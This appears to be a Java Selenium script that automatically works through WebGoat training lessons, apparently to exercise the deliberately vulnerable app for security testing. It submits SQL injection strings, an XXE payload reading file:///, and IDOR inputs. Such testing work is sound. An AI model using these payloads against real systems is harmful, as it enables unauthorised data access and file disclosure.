package com.contrastsecurity.webgoat.selenium;

import java.io.File;
import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.StaleElementReferenceException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

public class ChromeScript {
    public static void run(String un, String pw, String url, boolean headless, boolean proxy, String proxyHost, String proxyPort, String driverPath, String browserBin) {
        ChromeOptions chromeOptions = new ChromeOptions();
        if (!browserBin.equals("null")) {
            chromeOptions.addExtensions(new File(browserBin));
        }

        chromeOptions.addArguments("--verbose");

        if (headless) {
            chromeOptions.addArguments("--headless");
        }

        if (proxy) {
            chromeOptions.addArguments("--proxy-server=" + proxyHost + ":" + proxyPort);
        }
    
        if (System.getProperty("os.name").startsWith("Windows")) {
            chromeOptions.addArguments("--disable-gpu");
        }
        System.setProperty("webdriver.chrome.driver", driverPath);
        WebDriver driver = new ChromeDriver(chromeOptions);

        try {
            driver.get(url + "/login");
            driver.manage().timeouts().implicitlyWait(4, TimeUnit.SECONDS);

            // Login
            driver.findElement(By.name("username")).sendKeys(un);
            driver.findElement(By.name("password")).sendKeys(pw);
            driver.findElement(By.className("btn")).click();

            // Check if user exists.  If not, create user.
            if (driver.getCurrentUrl().equals(url + "/login?error")) {
                driver.get(url + "/registration");
                driver.findElement(By.id("username")).sendKeys(un);
                driver.findElement(By.id("password")).sendKeys(pw);
                driver.findElement(By.id("matchingPassword")).sendKeys(pw);
                driver.findElement(By.name("agree")).click();
                driver.findElement(By.className("btn-primary")).click();
            }

            // Navigate to String SQL Injection section
            driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/6");
            delay(1000);
            retryingFindSendKeys(driver, By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[9]/div[2]/form/table/tbody/tr/td[2]/input"), "' OR '1'='1");
            //driver.findElement(By.name("account")).sendKeys("' OR '1'='1");
            driver.findElement(By.name("Get Account Info")).click();

            // Navigate to Numeric SQL Injection section
            driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/7");
            driver.findElement(By.name("userid")).sendKeys("1 OR 1=1");
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[10]/div[2]/form/table/tbody/tr/td[3]/input")).click();

            // Navigate to SQL Injection (advanced)
            driver.get(url + "/start.mvc#lesson/SqlInjectionAdvanced.lesson/2");
            driver.findElement(By.name("userid_6a")).sendKeys("Smith'; SELECT * FROM user_system_data WHERE '1'='1");
            driver.findElement(By.name("Get Account Info")).click();
            driver.findElement(By.name("userid_6b")).sendKeys("dave");
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[5]/div[3]/form/table/tbody/tr/td[3]/input")).click();

            // This is not a valid exploit and commenting out for now
            //driver.get(url + "/start.mvc#lesson/SqlInjectionAdvanced.lesson/4");
            //driver.findElement(By.id("username4")).sendKeys("username");
            //driver.findElement(By.id("password4")).sendKeys("password");
            //driver.findElement(By.id("login-submit")).click();

            // SQL Injection (mitigations)
            //driver.navigate().to(url + "/start.mvc#lesson/SqlInjectionMitigations.lesson/7");
            //delay(1000);
            //driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[10]/div[3]/form[1]/div/div/div/table/thead/tr/th[4]/span")).click();

            // XXE (page 3)
            driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/2");
            driver.findElement(By.id("commentInputSimple")).sendKeys("<!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><comment><text>&root;");
            driver.findElement(By.id("postCommentSimple")).submit();

            // XXE (page 4)
            driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/3");
            retryingFindSendKeys(driver, By.id("commentInputContentType"), "Test comment 2");
            // not my comment out driver.findElement(By.id("commentInputContentType")).sendKeys("Test comment 2");
            driver.findElement(By.id("postCommentContentType")).submit();

            //XXE (page 7)
            //driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/6");
            //driver.findElement(By.id("commentInputBlind")).sendKeys("Test comment 3");
            //driver.findElement(By.id("postCommentBlind")).submit();

            // XSS (page 2)
            driver.navigate().to(url + "/start.mvc#lesson/CrossSiteScripting.lesson/1");
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[4]/div[3]/div[1]/form/table/tbody/tr/td[2]/input")).sendKeys("Yes");
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[4]/div[3]/div[1]/form/table/tbody/tr/td[3]/input")).submit();

            // XSS (page 7)
            driver.navigate().to(url + "/start.mvc#lesson/CrossSiteScripting.lesson/6");
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[9]/div[2]/div[1]/form/table[2]/tbody/tr[1]/td[3]/input")).submit();
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[9]/div[2]/div[1]/form/table[2]/tbody/tr[5]/td/input")).submit();

            // XSS (page 10)
            driver.navigate().to(url + "/start.mvc#lesson/CrossSiteScripting.lesson/9");
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[12]/div[2]/form/input[1]")).sendKeys("Test");
            driver.findElement(By.name("SubmitTestRoute")).submit();

            // XSS (page 11)
            driver.navigate().to(url + "/start.mvc#lesson/CrossSiteScripting.lesson/10");
            driver.findElement(By.name("successMessage")).sendKeys("Test");
            driver.findElement(By.name("submitMessage")).submit();

            // Insecure Direct Object References (page 2)
            driver.navigate().to(url + "/start.mvc#lesson/IDOR.lesson/1");
            delay(3000);
            driver.findElement(By.name("username")).sendKeys("tom");
            driver.findElement(By.name("password")).sendKeys("cat");
            driver.findElement(By.name("submit")).submit();

            // Insecure Direct Object References (page 3)
            driver.navigate().to(url + "/start.mvc#lesson/IDOR.lesson/2");
            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[5]/div[2]/form/input")).submit();
            driver.findElement(By.name("attributes")).sendKeys("role,userId");
            driver.findElement(By.name("Submit Diffs")).submit();
            System.out.println("Successfully finished Chrome script!");
        } finally {
            driver.quit();
        }
    }

    private static void retryingFindSendKeys(WebDriver driver, By by, String text) {
        //boolean result = false;
        int attempts = 0;
        while(attempts < 100) {
            try {
                driver.findElement(by).sendKeys(text);
                //result = true;
                break;
            } catch(StaleElementReferenceException e) {}
            attempts++;
        }
    }

    private static void delay (long time) {
        try {
            Thread.sleep(time);
        }
        catch(InterruptedException ex) {
            Thread.currentThread().interrupt();
        }
    }

}
